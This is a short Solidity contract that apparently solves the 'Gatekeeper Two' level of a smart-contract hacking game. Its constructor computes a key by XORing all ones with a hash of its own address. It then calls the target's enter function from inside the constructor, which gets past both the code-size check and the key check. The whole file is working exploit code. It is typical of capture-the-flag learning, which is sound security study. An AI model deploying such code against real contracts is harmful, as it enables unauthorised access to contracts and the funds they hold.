pragma solidity ^0.6.0;


contract GatekeeperBreak2 {

  constructor(address _addr) public {
      bytes8 key = bytes8((uint64(0) - 1) ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
      _addr.call(
            abi.encodeWithSignature("enter(bytes8)", key));
  }

}